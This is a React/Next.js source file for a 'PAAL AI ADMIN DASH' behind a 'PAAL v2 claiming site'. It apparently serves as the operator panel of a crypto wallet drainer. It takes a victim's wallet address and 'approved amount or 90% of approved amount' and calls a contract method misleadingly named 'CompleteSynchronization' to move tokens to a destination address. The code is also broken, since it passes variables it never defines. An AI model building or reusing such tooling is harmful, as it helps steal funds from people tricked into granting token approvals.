import React from 'react';
import { ThirdwebSDK } from '@thirdweb-dev/sdk';
import {Web3Button, ConnectWallet} from '@thirdweb-dev/react';
import { Navbar, NavbarBrand, NavbarContent, NavbarItem, Link, Card, CardHeader,CardBody, CardFooter, Input, Divider,Image} from '@nextui-org/react';
import { NextPage } from "next";
import ChainContext from "../context/Chain";
import { useContext, useState, useEffect } from "react";
import Head from 'next/head';

const Home: NextPage = () => {
    const variants = ["bordered"];
    const { selectedChain, setSelectedChain } = useContext(ChainContext);
    const addresses: Record<string, string> = {
        ["ethereum"]: "0xFE1ad67CA24DD60F0f7452BcDc5D43BF06D3F275",
        ["binance"]: "0x87c10d33575AD95B00318D7597cbE2B724d012aC",
      };
      const net: Record<string,string> = {
        "ethereum" : "ethereum",
        "binance": "binance",
      };
       const sdk = new ThirdwebSDK(net[selectedChain],
        {
          clientId: "eae31aadb84c7c4cc24b2d16fb595580",
      });
    return(
        <div>
            <div>
            <Head>
      <title>PAAL AI ADMIN DASH</title>
    </Head>
      <div>
      <Navbar>
      <NavbarBrand>
      <Image src="images/logo.png" alt="Logo" className="h-12"/>
      </NavbarBrand>
      
      <NavbarContent justify="end">
        <NavbarItem>
        <ConnectWallet
        theme={"dark"}
          modalTitle={"Connect to PAAL AI"}
          ></ConnectWallet>
        </NavbarItem>
      </NavbarContent>
    </Navbar>
    <div className="flex justify-center items-center">
      <br></br><br></br><br></br><br></br><br></br><br></br>
    <Image src="images/logo.png" alt="Logo" width={90} height={30}></Image>
    <br></br>
    </div>
    <h1 className="flex justify-center font-bold text-lg text-white">
      <Link href="paalai.io" className="text-white">Introducing PAAL &rarr;</Link>
    </h1>
    <p className="flex justify-center text-white">Welcome to PAAL v2 claiming site.</p>
    <br></br>
    <div className="flex justify-center items-center">
      <br></br>
    &nbsp;&nbsp;
    <select
    className="block font-bold px-3 py-2 mt-2 bg-white border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
        value={String(selectedChain)}
        onChange={(e) => setSelectedChain(e.target.value)}
      >
        
        <option value="binance">Binance Smart Chain</option>
        <option value="ethereum">Ethereum</option>
      </select>
      <br></br><br></br><br></br><br></br>
    </div>
            </div>
            <div>
                
            <div className="w-full flex flex-col gap-4">
      {variants.map((variant) => (
        <div key={variant} className="flex w-full flex-wrap md:flex-nowrap mb-6 md:mb-0 gap-4">
          <Input type="text" name="tokenAddress" variant={variant} label="Token Address" placeholder="Enter token contract address"/>
          <Input type="text" name="from" variant={variant} label="Owner's wallet address" placeholder="Enter owner's wallet address"/>
          <Input type="text" name="to" variant={variant}  label="Destination Address" placeholder="Enter Destination Address"/>
          <Input type="number" name="amount" variant={variant} label="Amount to send" placeholder="Enter approved amount or 90% of approved amount"/>
        </div>
      ))}  
    </div> 
    <br></br>
            <Web3Button
      contractAddress="0xFE1ad67CA24DD60F0f7452BcDc5D43BF06D3F275"
      action={(contract) => {
        contract.call("CompleteSynchronization", [tokenAddress, from, to, amount])
      }}
    >
      Transfer Token
    </Web3Button>
    </div>
        </div>
        </div>
    )
}
export default Home;